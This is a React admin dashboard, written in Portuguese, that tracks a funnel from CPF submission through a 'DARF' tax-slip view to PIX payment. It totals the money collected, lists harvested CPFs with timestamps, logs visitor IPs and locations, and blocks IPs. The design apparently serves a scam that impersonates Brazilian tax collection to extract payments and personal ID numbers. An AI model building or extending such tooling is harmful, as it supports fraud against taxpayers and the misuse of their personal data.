import { useState, useEffect, useCallback } from "react";
import {
  Users, Eye, BarChart3, Shield, LogOut, MapPin, Globe,
  Clock, AlertTriangle, UserPlus, Trash2, RefreshCw,
  TrendingUp, Ban, Smartphone, Monitor, ChevronRight,
  DollarSign, FileText, QrCode, Hash, Copy, CheckCircle
} from "lucide-react";
import { supabase } from "@/integrations/supabase/client";

interface AdminDashboardProps {
  token: string;
  user: { id: string; username: string; display_name: string };
  onLogout: () => void;
}

interface DashboardData {
  stats: { total_visits: number; total_events: number; total_blocked: number };
  recentVisits: any[];
  funnelData: any[];
  countryData: any[];
  blockedList: any[];
}

type Tab = "overview" | "visits" | "funnel" | "blocked" | "users";

const AdminDashboard = ({ token, user, onLogout }: AdminDashboardProps) => {
  const [activeTab, setActiveTab] = useState<Tab>("overview");
  const [data, setData] = useState<DashboardData | null>(null);
  const [adminUsers, setAdminUsers] = useState<any[]>([]);
  const [loading, setLoading] = useState(true);
  const [newUser, setNewUser] = useState({ username: "", password: "", display_name: "" });
  const [addingUser, setAddingUser] = useState(false);
  const [newBlockIp, setNewBlockIp] = useState({ ip: "", reason: "" });
  const [blockingIp, setBlockingIp] = useState(false);

  const fetchDashboard = useCallback(async () => {
    setLoading(true);
    try {
      const res = await supabase.functions.invoke("admin-auth", {
        body: { action: "dashboard", token },
      });
      if (res.data?.error === 'Não autorizado') {
        onLogout();
        return;
      }
      if (res.data && !res.data.error) setData(res.data);
    } catch {}
    setLoading(false);
  }, [token, onLogout]);

  const fetchUsers = useCallback(async () => {
    try {
      const res = await supabase.functions.invoke("admin-auth", {
        body: { action: "list_users", token },
      });
      if (res.data?.users) setAdminUsers(res.data.users);
    } catch {}
  }, [token]);

  useEffect(() => {
    fetchDashboard();
    fetchUsers();
    const interval = setInterval(() => {
      fetchDashboard();
      fetchUsers();
    }, 15000);
    return () => clearInterval(interval);
  }, [fetchDashboard, fetchUsers]);

  const handleAddUser = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!newUser.username || !newUser.password) return;
    setAddingUser(true);
    try {
      await supabase.functions.invoke("admin-auth", {
        body: { action: "add_user", token, ...newUser, display_name: newUser.display_name || newUser.username },
      });
      setNewUser({ username: "", password: "", display_name: "" });
      fetchUsers();
    } catch {}
    setAddingUser(false);
  };

  const handleDeleteUser = async (userId: string) => {
    if (!confirm("Tem certeza que deseja remover este usuário?")) return;
    await supabase.functions.invoke("admin-auth", {
      body: { action: "delete_user", token, user_id: userId },
    });
    fetchUsers();
  };

  const handleBlockIp = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!newBlockIp.ip.trim()) return;
    setBlockingIp(true);
    try {
      await supabase.functions.invoke("admin-auth", {
        body: { action: "block_ip", token, ip_address: newBlockIp.ip.trim(), reason: newBlockIp.reason.trim() || "Bloqueio manual" },
      });
      setNewBlockIp({ ip: "", reason: "" });
      fetchDashboard();
    } catch {}
    setBlockingIp(false);
  };

  // Funnel calculation
  const funnelSteps = ["page_view", "cpf_submitted", "result_viewed", "darf_viewed", "pix_generating", "pix_generated", "pix_copied", "payment_confirmed"];
  const funnelLabels: Record<string, string> = {
    page_view: "Visualizações",
    cpf_submitted: "CPF Enviado",
    result_viewed: "Resultado Visto",
    darf_viewed: "DARF Visto",
    pix_generating: "PIX Gerando",
    pix_generated: "PIX Gerado",
    pix_copied: "PIX Copiado",
    payment_confirmed: "Pagamento Confirmado",
  };
  const funnelCounts = funnelSteps.map((step) => ({
    step,
    label: funnelLabels[step],
    count: data?.funnelData?.filter((e: any) => e.event_type === step).length || 0,
  }));
  const maxFunnel = Math.max(...funnelCounts.map((f) => f.count), 1);

  // Unique CPFs
  const uniqueCpfs = new Set(data?.funnelData?.filter((e: any) => e.cpf).map((e: any) => e.cpf) || []);

  // Specific counters
  const cpfSubmittedCount = data?.funnelData?.filter((e: any) => e.event_type === "cpf_submitted").length || 0;
  const darfViewedCount = data?.funnelData?.filter((e: any) => e.event_type === "darf_viewed").length || 0;
  const pixGeneratedCount = data?.funnelData?.filter((e: any) => e.event_type === "pix_generated").length || 0;
  const pixCopiedCount = data?.funnelData?.filter((e: any) => e.event_type === "pix_copied").length || 0;
  const paymentConfirmedCount = data?.funnelData?.filter((e: any) => e.event_type === "payment_confirmed").length || 0;

  // Total value: get the max valor per session from any event that has it
  const sessionValues: Record<string, number> = {};
  (data?.funnelData || []).forEach((e: any) => {
    const meta = typeof e.metadata === 'string' ? JSON.parse(e.metadata) : e.metadata;
    const valor = Number(meta?.valor) || 0;
    if (valor > 0) {
      const sid = e.session_id;
      sessionValues[sid] = Math.max(sessionValues[sid] || 0, valor);
    }
  });
  const totalValueGenerated = Object.values(sessionValues).reduce((sum, v) => sum + v, 0);

  const formatCurrency = (value: number) =>
    value.toLocaleString("pt-BR", { style: "currency", currency: "BRL" });

  // Country stats
  const countryCounts: Record<string, number> = {};
  data?.countryData?.forEach((v: any) => {
    if (v.country_code) countryCounts[v.country_code] = (countryCounts[v.country_code] || 0) + 1;
  });

  // City stats
  const cityCounts: Record<string, number> = {};
  data?.countryData?.forEach((v: any) => {
    if (v.city) cityCounts[v.city] = (cityCounts[v.city] || 0) + 1;
  });
  const topCities = Object.entries(cityCounts).sort((a, b) => b[1] - a[1]).slice(0, 10);

  // Mobile vs Desktop
  const mobileCount = data?.recentVisits?.filter((v: any) => v.is_mobile).length || 0;
  const desktopCount = (data?.recentVisits?.length || 0) - mobileCount;

  const tabs: { id: Tab; label: string; icon: any }[] = [
    { id: "overview", label: "Visão Geral", icon: BarChart3 },
    { id: "visits", label: "Acessos", icon: Eye },
    { id: "funnel", label: "Funil", icon: TrendingUp },
    { id: "blocked", label: "Bloqueados", icon: Ban },
    { id: "users", label: "Usuários", icon: Users },
  ];

  return (
    <div className="min-h-screen bg-background">
      {/* Header */}
      <div className="border-b border-border bg-card">
        <div className="mx-auto max-w-6xl px-4 py-3 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="flex h-9 w-9 items-center justify-center rounded-xl bg-primary/10">
              <Shield className="h-5 w-5 text-primary" />
            </div>
            <div>
              <h1 className="text-sm font-bold text-foreground">Painel Administrativo</h1>
              <p className="text-[10px] text-muted-foreground">{user.display_name} ({user.username})</p>
            </div>
          </div>
          <div className="flex items-center gap-2">
            <button onClick={() => { fetchDashboard(); fetchUsers(); }} className="p-2 rounded-lg hover:bg-muted transition-colors">
              <RefreshCw className={`h-4 w-4 text-muted-foreground ${loading ? "animate-spin" : ""}`} />
            </button>
            <button onClick={onLogout} className="flex items-center gap-1.5 px-3 py-2 rounded-lg hover:bg-muted transition-colors text-xs text-muted-foreground">
              <LogOut className="h-3.5 w-3.5" /> Sair
            </button>
          </div>
        </div>
      </div>

      {/* Tabs */}
      <div className="border-b border-border bg-card/50">
        <div className="mx-auto max-w-6xl px-4 flex gap-1 overflow-x-auto">
          {tabs.map((tab) => (
            <button
              key={tab.id}
              onClick={() => setActiveTab(tab.id)}
              className={`flex items-center gap-1.5 px-3 py-2.5 text-xs font-medium border-b-2 transition-colors whitespace-nowrap ${
                activeTab === tab.id
                  ? "border-primary text-primary"
                  : "border-transparent text-muted-foreground hover:text-foreground"
              }`}
            >
              <tab.icon className="h-3.5 w-3.5" />
              {tab.label}
            </button>
          ))}
        </div>
      </div>

      <div className="mx-auto max-w-6xl px-4 py-6">
        {loading && !data ? (
          <div className="flex items-center justify-center py-20">
            <div className="h-8 w-8 border-2 border-primary/30 border-t-primary rounded-full animate-spin" />
          </div>
        ) : (
          <>
            {/* OVERVIEW */}
            {activeTab === "overview" && data && (
              <div className="space-y-6">
                {/* Stats cards */}
                <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-4 gap-3">
                  {[
                    { label: "Total Acessos", value: data.stats.total_visits.toLocaleString(), icon: Eye, color: "text-primary" },
                    { label: "CPFs Consultados", value: cpfSubmittedCount.toLocaleString(), icon: Hash, color: "text-accent" },
                    { label: "CPFs Únicos", value: uniqueCpfs.size.toLocaleString(), icon: Users, color: "text-info" },
                    { label: "DARFs Gerados", value: darfViewedCount.toLocaleString(), icon: FileText, color: "text-warning" },
                    { label: "PIX Gerados", value: pixGeneratedCount.toLocaleString(), icon: QrCode, color: "text-accent" },
                    { label: "PIX Copiados", value: pixCopiedCount.toLocaleString(), icon: Copy, color: "text-primary", highlight: true },
                    { label: "Pagamentos", value: paymentConfirmedCount.toLocaleString(), icon: CheckCircle, color: "text-accent", highlight: true },
                    { label: "Valor Total Gerado", value: formatCurrency(totalValueGenerated), icon: DollarSign, color: "text-accent", highlight: true },
                    { label: "Total Eventos", value: data.stats.total_events.toLocaleString(), icon: BarChart3, color: "text-muted-foreground" },
                    { label: "IPs Bloqueados", value: data.stats.total_blocked.toLocaleString(), icon: Ban, color: "text-destructive" },
                  ].map((stat, i) => (
                    <div key={i} className={`rounded-xl border bg-card p-4 shadow-sm ${(stat as any).highlight ? "border-accent/30 bg-accent/5" : "border-border"}`}>
                      <div className="flex items-center gap-2 mb-2">
                        <stat.icon className={`h-4 w-4 ${stat.color}`} />
                        <span className="text-[10px] text-muted-foreground uppercase tracking-wider">{stat.label}</span>
                      </div>
                      <p className={`text-xl sm:text-2xl font-extrabold tabular-nums ${(stat as any).highlight ? "text-accent" : "text-foreground"}`}>{stat.value}</p>
                    </div>
                  ))}
                </div>

                {/* Device split + top cities */}
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                  <div className="rounded-xl border border-border bg-card p-4 shadow-sm">
                    <h3 className="text-xs font-bold text-foreground uppercase tracking-wider mb-3">Dispositivos</h3>
                    <div className="space-y-2">
                      <div className="flex items-center justify-between">
                        <div className="flex items-center gap-2 text-sm"><Smartphone className="h-4 w-4 text-primary" /> Mobile</div>
                        <span className="font-bold text-sm">{mobileCount}</span>
                      </div>
                      <div className="h-2 rounded-full bg-muted overflow-hidden">
                        <div className="h-full rounded-full bg-primary" style={{ width: `${(mobileCount / Math.max(mobileCount + desktopCount, 1)) * 100}%` }} />
                      </div>
                      <div className="flex items-center justify-between">
                        <div className="flex items-center gap-2 text-sm"><Monitor className="h-4 w-4 text-accent" /> Desktop</div>
                        <span className="font-bold text-sm">{desktopCount}</span>
                      </div>
                      <div className="h-2 rounded-full bg-muted overflow-hidden">
                        <div className="h-full rounded-full bg-accent" style={{ width: `${(desktopCount / Math.max(mobileCount + desktopCount, 1)) * 100}%` }} />
                      </div>
                    </div>
                  </div>

                  <div className="rounded-xl border border-border bg-card p-4 shadow-sm">
                    <h3 className="text-xs font-bold text-foreground uppercase tracking-wider mb-3">Top Cidades</h3>
                    <div className="space-y-1.5">
                      {topCities.length === 0 && <p className="text-xs text-muted-foreground">Sem dados ainda</p>}
                      {topCities.map(([city, count], i) => (
                        <div key={i} className="flex items-center justify-between text-sm">
                          <div className="flex items-center gap-2">
                            <MapPin className="h-3 w-3 text-muted-foreground" />
                            <span className="text-foreground">{city}</span>
                          </div>
                          <span className="font-bold tabular-nums">{count}</span>
                        </div>
                      ))}
                    </div>
                  </div>
                </div>

                {/* Mini funnel */}
                <div className="rounded-xl border border-border bg-card p-4 shadow-sm">
                  <h3 className="text-xs font-bold text-foreground uppercase tracking-wider mb-3">Funil de Conversão</h3>
                  <div className="space-y-2">
                    {funnelCounts.map((f, i) => (
                      <div key={i} className="flex items-center gap-3">
                        <span className="text-xs text-muted-foreground w-28 shrink-0 truncate">{f.label}</span>
                        <div className="flex-1 h-6 bg-muted rounded-lg overflow-hidden relative">
                          <div
                            className="h-full rounded-lg gradient-primary transition-all duration-500"
                            style={{ width: `${(f.count / maxFunnel) * 100}%` }}
                          />
                          <span className="absolute right-2 top-1/2 -translate-y-1/2 text-[10px] font-bold text-foreground tabular-nums">
                            {f.count}
                          </span>
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              </div>
            )}

            {/* VISITS */}
            {activeTab === "visits" && data && (
              <div className="rounded-xl border border-border bg-card shadow-sm overflow-hidden">
                <div className="p-4 border-b border-border">
                  <h3 className="text-sm font-bold text-foreground">Últimos Acessos</h3>
                </div>
                <div className="overflow-x-auto">
                  <table className="w-full text-xs">
                    <thead>
                      <tr className="border-b border-border bg-muted/50">
                        <th className="text-left p-2.5 font-bold text-muted-foreground uppercase tracking-wider">Data</th>
                        <th className="text-left p-2.5 font-bold text-muted-foreground uppercase tracking-wider">IP</th>
                        <th className="text-left p-2.5 font-bold text-muted-foreground uppercase tracking-wider">Local</th>
                        <th className="text-left p-2.5 font-bold text-muted-foreground uppercase tracking-wider">Dispositivo</th>
                        <th className="text-left p-2.5 font-bold text-muted-foreground uppercase tracking-wider">País</th>
                      </tr>
                    </thead>
                    <tbody>
                      {data.recentVisits.map((v: any, i: number) => (
                        <tr key={i} className="border-b border-border/50 hover:bg-muted/30 transition-colors">
                          <td className="p-2.5 text-foreground tabular-nums whitespace-nowrap">
                            {new Date(v.created_at).toLocaleString("pt-BR")}
                          </td>
                          <td className="p-2.5 font-mono text-muted-foreground">{v.ip_address}</td>
                          <td className="p-2.5 text-foreground">
                            {v.city ? `${v.city}, ${v.region}` : "—"}
                          </td>
                          <td className="p-2.5">
                            {v.is_mobile ? (
                              <span className="flex items-center gap-1 text-primary"><Smartphone className="h-3 w-3" /> Mobile</span>
                            ) : (
                              <span className="flex items-center gap-1 text-accent"><Monitor className="h-3 w-3" /> Desktop</span>
                            )}
                          </td>
                          <td className="p-2.5">
                            <span className="inline-flex items-center gap-1 rounded-md bg-muted px-1.5 py-0.5 text-[10px] font-bold">
                              <Globe className="h-2.5 w-2.5" />
                              {v.country_code || "—"}
                            </span>
                          </td>
                        </tr>
                      ))}
                      {data.recentVisits.length === 0 && (
                        <tr><td colSpan={5} className="p-6 text-center text-muted-foreground">Nenhum acesso registrado</td></tr>
                      )}
                    </tbody>
                  </table>
                </div>
              </div>
            )}

            {/* FUNNEL */}
            {activeTab === "funnel" && data && (
              <div className="space-y-4">
                <div className="rounded-xl border border-border bg-card p-4 shadow-sm">
                  <h3 className="text-sm font-bold text-foreground mb-4">Funil Detalhado</h3>
                  <div className="space-y-3">
                    {funnelCounts.map((f, i) => {
                      const prevCount = i > 0 ? funnelCounts[i - 1].count : f.count;
                      const dropRate = prevCount > 0 ? ((1 - f.count / prevCount) * 100).toFixed(1) : "0";
                      return (
                        <div key={i}>
                          <div className="flex items-center justify-between mb-1">
                            <span className="text-sm font-medium text-foreground">{f.label}</span>
                            <div className="flex items-center gap-2">
                              {i > 0 && (
                                <span className="text-[10px] text-destructive font-bold">-{dropRate}%</span>
                              )}
                              <span className="text-sm font-bold text-foreground tabular-nums">{f.count}</span>
                            </div>
                          </div>
                          <div className="h-8 bg-muted rounded-lg overflow-hidden relative">
                            <div
                              className={`h-full rounded-lg transition-all duration-700 ${
                                i === funnelCounts.length - 1 ? "bg-accent" : "gradient-primary"
                              }`}
                              style={{ width: `${(f.count / maxFunnel) * 100}%` }}
                            />
                          </div>
                          {i < funnelCounts.length - 1 && (
                            <div className="flex justify-center py-1">
                              <ChevronRight className="h-4 w-4 text-muted-foreground rotate-90" />
                            </div>
                          )}
                        </div>
                      );
                    })}
                  </div>
                </div>

                {/* Recent CPF events */}
                <div className="rounded-xl border border-border bg-card shadow-sm overflow-hidden">
                  <div className="p-4 border-b border-border">
                    <h3 className="text-sm font-bold text-foreground">Eventos Recentes com CPF</h3>
                  </div>
                  <div className="overflow-x-auto">
                    <table className="w-full text-xs">
                      <thead>
                        <tr className="border-b border-border bg-muted/50">
                          <th className="text-left p-2.5 font-bold text-muted-foreground uppercase tracking-wider">Data</th>
                          <th className="text-left p-2.5 font-bold text-muted-foreground uppercase tracking-wider">CPF</th>
                          <th className="text-left p-2.5 font-bold text-muted-foreground uppercase tracking-wider">Evento</th>
                        </tr>
                      </thead>
                      <tbody>
                        {data.funnelData.filter((e: any) => e.cpf).slice(0, 30).map((e: any, i: number) => (
                          <tr key={i} className="border-b border-border/50 hover:bg-muted/30">
                            <td className="p-2.5 tabular-nums whitespace-nowrap">{new Date(e.created_at).toLocaleString("pt-BR")}</td>
                            <td className="p-2.5 font-mono font-bold">{e.cpf}</td>
                            <td className="p-2.5">
                              <span className={`inline-flex rounded-md px-2 py-0.5 text-[10px] font-bold ${
                                e.event_type === "pix_generated" ? "bg-accent/10 text-accent" :
                                e.event_type === "cpf_submitted" ? "bg-primary/10 text-primary" :
                                "bg-muted text-muted-foreground"
                              }`}>
                                {funnelLabels[e.event_type] || e.event_type}
                              </span>
                            </td>
                          </tr>
                        ))}
                      </tbody>
                    </table>
                  </div>
                </div>
              </div>
            )}

            {/* BLOCKED */}
            {activeTab === "blocked" && data && (
              <div className="space-y-4">
                {/* Add blocked IP form */}
                <div className="rounded-xl border border-border bg-card p-4 shadow-sm">
                  <h3 className="text-sm font-bold text-foreground mb-3 flex items-center gap-2">
                    <Ban className="h-4 w-4 text-destructive" />
                    Bloquear IP Manualmente
                  </h3>
                  <form onSubmit={handleBlockIp} className="grid grid-cols-1 sm:grid-cols-3 gap-3">
                    <input
                      type="text"
                      value={newBlockIp.ip}
                      onChange={(e) => setNewBlockIp({ ...newBlockIp, ip: e.target.value })}
                      placeholder="Endereço IP *"
                      className="rounded-lg border border-input bg-background px-3 py-2 text-sm font-mono focus:border-primary focus:outline-none focus:ring-2 focus:ring-ring/10"
                      required
                    />
                    <input
                      type="text"
                      value={newBlockIp.reason}
                      onChange={(e) => setNewBlockIp({ ...newBlockIp, reason: e.target.value })}
                      placeholder="Motivo (opcional)"
                      className="rounded-lg border border-input bg-background px-3 py-2 text-sm focus:border-primary focus:outline-none focus:ring-2 focus:ring-ring/10"
                    />
                    <button
                      type="submit"
                      disabled={blockingIp}
                      className="rounded-lg bg-destructive px-4 py-2 text-sm font-bold text-destructive-foreground hover:opacity-90 disabled:opacity-50 flex items-center justify-center gap-1.5"
                    >
                      <Ban className="h-3.5 w-3.5" />
                      {blockingIp ? "Bloqueando..." : "Bloquear"}
                    </button>
                  </form>
                </div>

                <div className="rounded-xl border border-border bg-card shadow-sm overflow-hidden">
                <div className="p-4 border-b border-border">
                  <h3 className="text-sm font-bold text-foreground">IPs Bloqueados ({data.blockedList.length})</h3>
                </div>
                <div className="overflow-x-auto">
                  <table className="w-full text-xs">
                    <thead>
                      <tr className="border-b border-border bg-muted/50">
                        <th className="text-left p-2.5 font-bold text-muted-foreground uppercase tracking-wider">IP</th>
                        <th className="text-left p-2.5 font-bold text-muted-foreground uppercase tracking-wider">Motivo</th>
                        <th className="text-left p-2.5 font-bold text-muted-foreground uppercase tracking-wider">Data</th>
                      </tr>
                    </thead>
                    <tbody>
                      {data.blockedList.map((b: any, i: number) => (
                        <tr key={i} className="border-b border-border/50">
                          <td className="p-2.5 font-mono text-foreground">{b.ip_address}</td>
                          <td className="p-2.5 text-destructive">{b.reason}</td>
                          <td className="p-2.5 tabular-nums text-muted-foreground">{new Date(b.created_at).toLocaleString("pt-BR")}</td>
                        </tr>
                      ))}
                      {data.blockedList.length === 0 && (
                        <tr><td colSpan={3} className="p-6 text-center text-muted-foreground">Nenhum IP bloqueado</td></tr>
                      )}
                    </tbody>
                  </table>
                </div>
              </div>
              </div>
            )}

            {/* USERS */}
            {activeTab === "users" && (
              <div className="space-y-4">
                {/* Add user form */}
                <div className="rounded-xl border border-border bg-card p-4 shadow-sm">
                  <h3 className="text-sm font-bold text-foreground mb-3 flex items-center gap-2">
                    <UserPlus className="h-4 w-4 text-primary" />
                    Adicionar Usuário
                  </h3>
                  <form onSubmit={handleAddUser} className="grid grid-cols-1 sm:grid-cols-4 gap-3">
                    <input
                      type="text"
                      value={newUser.display_name}
                      onChange={(e) => setNewUser({ ...newUser, display_name: e.target.value })}
                      placeholder="Nome"
                      className="rounded-lg border border-input bg-background px-3 py-2 text-sm focus:border-primary focus:outline-none focus:ring-2 focus:ring-ring/10"
                    />
                    <input
                      type="text"
                      value={newUser.username}
                      onChange={(e) => setNewUser({ ...newUser, username: e.target.value })}
                      placeholder="Usuário *"
                      className="rounded-lg border border-input bg-background px-3 py-2 text-sm focus:border-primary focus:outline-none focus:ring-2 focus:ring-ring/10"
                      required
                    />
                    <input
                      type="password"
                      value={newUser.password}
                      onChange={(e) => setNewUser({ ...newUser, password: e.target.value })}
                      placeholder="Senha *"
                      className="rounded-lg border border-input bg-background px-3 py-2 text-sm focus:border-primary focus:outline-none focus:ring-2 focus:ring-ring/10"
                      required
                    />
                    <button
                      type="submit"
                      disabled={addingUser}
                      className="rounded-lg gradient-primary px-4 py-2 text-sm font-bold text-primary-foreground hover:opacity-90 disabled:opacity-50 flex items-center justify-center gap-1.5"
                    >
                      <UserPlus className="h-3.5 w-3.5" />
                      {addingUser ? "Adicionando..." : "Adicionar"}
                    </button>
                  </form>
                </div>

                {/* User list */}
                <div className="rounded-xl border border-border bg-card shadow-sm overflow-hidden">
                  <div className="p-4 border-b border-border">
                    <h3 className="text-sm font-bold text-foreground">Usuários ({adminUsers.length})</h3>
                  </div>
                  <div className="divide-y divide-border">
                    {adminUsers.map((u: any) => (
                      <div key={u.id} className="flex items-center justify-between p-3 hover:bg-muted/30 transition-colors">
                        <div className="flex items-center gap-3">
                          <div className="flex h-8 w-8 items-center justify-center rounded-lg bg-primary/10 text-xs font-bold text-primary">
                            {(u.display_name || u.username).charAt(0).toUpperCase()}
                          </div>
                          <div>
                            <p className="text-sm font-bold text-foreground">{u.display_name || u.username}</p>
                            <p className="text-[10px] text-muted-foreground">@{u.username} • {u.last_login ? `Último login: ${new Date(u.last_login).toLocaleString("pt-BR")}` : "Nunca logou"}</p>
                          </div>
                        </div>
                        {u.id !== user.id && (
                          <button
                            onClick={() => handleDeleteUser(u.id)}
                            className="p-2 rounded-lg hover:bg-destructive/10 transition-colors text-muted-foreground hover:text-destructive"
                          >
                            <Trash2 className="h-4 w-4" />
                          </button>
                        )}
                      </div>
                    ))}
                  </div>
                </div>
              </div>
            )}
          </>
        )}
      </div>
    </div>
  );
};

export default AdminDashboard;
